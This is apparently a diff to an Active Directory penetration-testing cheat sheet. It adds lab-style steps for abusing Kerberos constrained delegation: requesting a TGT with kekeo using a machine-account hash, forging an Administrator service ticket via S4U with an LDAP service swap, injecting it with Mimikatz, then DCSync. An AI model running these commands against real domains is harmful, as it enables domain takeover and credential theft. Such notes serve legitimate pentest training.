@@ -326,6 +326,22 @@ for example, we could psexec if delegate for cifs:
 ```
 psexec.py <domain>/<user-impersonate>@<FQDN-TargetMachine> -k -no-pass -target-ip <ip> -dc-ip <ip>
 ```
+  
+With kekeo we can request tgs for another service since there is no sname validation:
+ask TGT:
+```
+tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:5e77978a734e3a7f3895fb0fdbda3b96
+```
+ask tgs and force ldap service tgs:
+```
+tgs::s4u /tgt:<TGT-Generated-Before>/user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.local|ldap/dcorp-dc.dollarcorp.moneycorp.local
+```
+then inject the ticket with mimikatz:
+```
+Invoke-Mimikatz -Command '"kerberos::ptt <Ticket.kirbi>"'
+```
+-> then we can dcsync with mimikatz
+
 --------------------------------------------------------------
 
 # Check LIST
